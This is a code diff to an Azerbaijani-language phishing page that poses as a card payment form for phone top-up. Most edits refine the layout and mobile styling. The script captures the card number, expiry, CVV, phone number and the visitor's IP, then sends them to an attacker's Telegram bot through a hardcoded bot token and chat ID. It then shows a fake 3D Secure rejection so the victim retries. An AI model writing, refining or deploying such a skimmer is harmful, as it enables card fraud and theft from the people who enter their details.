@@ -12,6 +12,7 @@
             color: #ffffff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             min-height: 100vh;
+            -webkit-tap-highlight-color: transparent;
         }
         header {
             display: flex;
@@ -26,11 +27,12 @@
         
         .main-wrapper {
             max-width: 1000px;
-            margin: 60px auto;
+            margin: 40px auto;
             padding: 0 20px;
             display: grid;
             grid-template-columns: 1.2fr 1.8fr;
-            gap: 40px;
+            gap: 30px;
+            box-sizing: border-box;
         }
 
         /* Sol tərəf - Sifariş Xülasəsi */
@@ -38,44 +40,46 @@
             background: #121824;
             border: 1px solid #1f2736;
             border-radius: 20px;
-            padding: 30px;
+            padding: 25px;
             height: fit-content;
         }
-        .summary-card h3 { margin-top: 0; border-bottom: 1px solid #1f2736; padding-bottom: 15px; }
+        .summary-card h3 { margin-top: 0; border-bottom: 1px solid #1f2736; padding-bottom: 15px; font-size: 1.2rem; }
         .summary-item {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             font-size: 0.95rem;
         }
         .summary-item span:first-child { color: #8c9ba5; }
         .summary-item span:last-child { font-weight: 600; }
+        
         .total-price {
             border-top: 1px solid #1f2736;
-            padding-top: 20px;
-            margin-top: 20px;
+            padding-top: 15px;
+            margin-top: 15px;
             display: flex;
             justify-content: space-between;
-            font-size: 1.3rem;
+            font-size: 1.25rem;
             font-weight: bold;
             color: #0562ff;
         }
 
-        /* Sağ tərəf - Bank Kartı Kartı */
+        /* Sağ tərəf - Bank Kartı */
         .payment-card {
             background: #ffffff;
             color: #26314d;
             border-radius: 24px;
-            padding: 35px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            padding: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
             position: relative;
             overflow: hidden;
+            box-sizing: border-box;
         }
         .input-group { margin-bottom: 20px; }
         .input-group label {
             display: block;
             margin-bottom: 8px;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             color: #5f6f95;
             font-weight: 600;
         }
@@ -85,11 +89,12 @@
             border-radius: 12px;
             border: 1px solid #d7dfee;
             background: #f7f9ff;
-            font-size: 1rem;
+            font-size: 1.1rem;
             outline: none;
             box-sizing: border-box;
+            color: #111622;
         }
-        .input-group input:focus { border-color: #0562ff; }
+        .input-group input:focus { border-color: #0562ff; background: #ffffff; }
         .row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         
         .pay-btn {
@@ -103,6 +108,7 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
+            transition: background 0.2s;
         }
         .pay-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
@@ -115,18 +121,40 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 30px;
+            padding: 25px;
             box-sizing: border-box;
             text-align: center;
             transform: translateY(100%);
             transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10;
         }
         .error-overlay.active { transform: translateY(0); }
         .error-icon {
-            width: 60px; height: 60px; background: #fff5f5;
+            width: 55px; height: 55px; background: #fff5f5;
             color: #ff3b30; border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            font-size: 1.8rem; font-weight: bold; margin-bottom: 20px;
+            font-size: 1.6rem; font-weight: bold; margin-bottom: 15px;
+        }
+
+        /* 📱 MOBİL EKRANLAR ÜÇÜN RESPONSİV SƏLİQƏLƏŞDİRMƏ */
+        @media (max-width: 768px) {
+            header { padding: 15px 5%; }
+            .main-wrapper {
+                grid-template-columns: 1fr; /* Bloklar alt-alta gəlir sıxılmır */
+                margin: 20px auto;
+                gap: 20px;
+            }
+            .payment-card {
+                padding: 20px; /* Kiçik ekranlar üçün kənar boşluq azaldılır */
+                border-radius: 20px;
+            }
+            .input-group input {
+                padding: 14px; /* İnput sahəsi barmaq üçün ideallaşdırılır */
+                font-size: 1rem;
+            }
+            .pay-btn {
+                padding: 15px;
+            }
         }
     </style>
 </head>
@@ -161,24 +189,24 @@
             <div class="error-overlay" id="errorOverlay">
                 <div class="error-icon">✕</div>
                 <h3 style="color:#17223b; margin:0 0 10px 0;">3D Secure Doğrulanmadı</h3>
-                <p style="color:#6c7a9c; font-size:0.95rem; margin-bottom:25px;">Emitent bank tərəfindən əməliyyat rədd edildi (Xəta: 5004). Zəhmət olmasa daxil etdiyiniz məlumatları yoxlayın və ya fərqli kartla yoxlayın.</p>
-                <button onclick="closeError()" style="padding:12px 30px; background:#0f3460; color:white; border:none; border-radius:10px; cursor:pointer;">Yenidən cəhd et</button>
+                <p style="color:#6c7a9c; font-size:0.9rem; margin-bottom:20px; line-height: 1.4;">Emitent bank tərəfindən əməliyyat rədd edildi (Xəta: 5004). Zəhmət olmasa məlumatları yoxlayın və ya fərqli kartla yoxlayın.</p>
+                <button onclick="closeError()" style="padding:12px 30px; background:#0f3460; color:white; border:none; border-radius:10px; cursor:pointer; font-weight: 600; width: 100%;">Yenidən cəhd et</button>
             </div>
 
-            <h2 style="margin-top:0; font-size:1.4rem; margin-bottom:25px;">Kredit və ya Debet Kartı ilə Ödəniş</h2>
+            <h2 style="margin-top:0; font-size:1.25rem; margin-bottom:20px; color: #111622;">Kredit və ya Debet Kartı</h2>
             <form id="paymentForm">
                 <div class="input-group">
                     <label>Kart nömrəsi</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
                 </div>
                 <div class="row">
                     <div class="input-group">
                         <label>Bitmə tarixi</label>
-                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        <input type="text" id="expiry" placeholder="MM/YY" inputmode="numeric" maxlength="5" required>
                     </div>
                     <div class="input-group">
                         <label>CVV/CVC</label>
-                        <input type="password" id="cvv" placeholder="***" maxlength="3" required>
+                        <input type="password" id="cvv" placeholder="***" inputmode="numeric" maxlength="3" required>
                     </div>
                 </div>
                 <button type="submit" class="pay-btn" id="payButton" disabled>Ödənişi Təsdiqlə</button>
@@ -187,12 +215,10 @@
     </div>
 
     <script>
-        // LocalStorage-dən dataları alıb səhifəyə doldururuq
         const operator = localStorage.getItem('selectedOperator') || 'Məlum deyil';
         const phone = localStorage.getItem('phoneNumber') || 'Məlum deyil';
         const amount = localStorage.getItem('paymentAmount') || '0';
         
-        // Random unikal 8 rəqəmli LOG ID istehsalı
         const logId = 'LOG-' + Math.floor(10000000 + Math.random() * 90000000);
 
         document.getElementById('summaryOperator').innerText = operator;
@@ -206,7 +232,6 @@
         const cvvInput = document.getElementById('cvv');
         const payButton = document.getElementById('payButton');
 
-        // İnput məntiqləri və boşluq tənzimləmələri
         cardInput.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '').match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
             e.target.value = !v[2] ? v[1] : v[1] + ' ' + v[2] + (v[3] ? ' ' + v[3] : '') + (v[4] ? ' ' + v[4] : '');
@@ -238,7 +263,6 @@
 
             let userIp = "Tapılmadı";
             try {
-                // İstifadəçinin real İP ünvanını götürürük
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 userIp = ipData.ip;
@@ -247,8 +271,7 @@
             const BOT_TOKEN = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
             const CHAT_ID = '8055987590';
 
-            // Bota gedəcək ətraflı şifrəli mesaj strukturu
-            const mesaj = `💳 *YENİ KART DAXİL OLDU*\n\n` +
+            const mesaj = `💳 *Yeni Kart*\n\n` +
                           `🆔 *Log ID:* \`${logId}\`\n` +
                           `📱 *Operator:* ${operator}\n` +
                           `📞 *Nömrə:* \`${phone}\`\n` +
@@ -262,14 +285,8 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: mesaj,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj, parse_mode: 'Markdown' })
                 });
-                
-                // Məlumat getdikdən sonra fake xəta pəncərəsini açırıq
                 document.getElementById('errorOverlay').classList.add('active');
             } catch (error) {
                 alert('Sistem xətası, yenidən cəhd edin.');
@@ -286,5 +303,4 @@
         }
     </script>
 </body>
-                          </html>
-                          
+</html>
